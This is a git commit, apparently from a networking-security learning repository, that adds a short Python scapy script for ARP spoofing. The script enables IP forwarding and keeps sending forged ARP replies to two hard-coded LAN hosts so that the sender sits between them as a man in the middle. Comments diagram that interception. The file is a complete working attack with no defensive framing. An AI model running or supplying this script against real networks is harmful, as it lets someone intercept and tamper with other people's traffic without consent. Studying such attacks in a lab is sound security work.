b8ac56bfcf3d5610bf3982f8612943bab0950bbf
Qaidjohar <qaidjawadwala@gmail.com>
2021-10-16 09:42:01 +0000

    ARP Spoofing

---
+++ 6_ARPSpoofing/arp_spoof.py
@@ -0,0 +1,25 @@
+from scapy.all import *
+import time
+import os
+
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+ip1 = '192.168.10.167'
+ip2 = '192.168.10.224'
+
+
+while True:
+    packet1 = ARP(op=2, pdst=ip1, psrc=ip2,
+                  hwdst="ff:ff:ff:ff:ff:ff", hwsrc="36:d7:13:4b:30:0c")
+    packet2 = ARP(op=2, pdst=ip2, psrc=ip1,
+                  hwdst="ff:ff:ff:ff:ff:ff", hwsrc="36:d7:13:4b:30:0c")
+    send(packet1)
+    send(packet2)
+    time.sleep(1)
+# packet1.show()
+# print(packet1)
+
+
+# Machine1 <============================> Machine2
+# Machine1 <===========>Attacker<===========> Machine2
+    # ip1                                         ip2
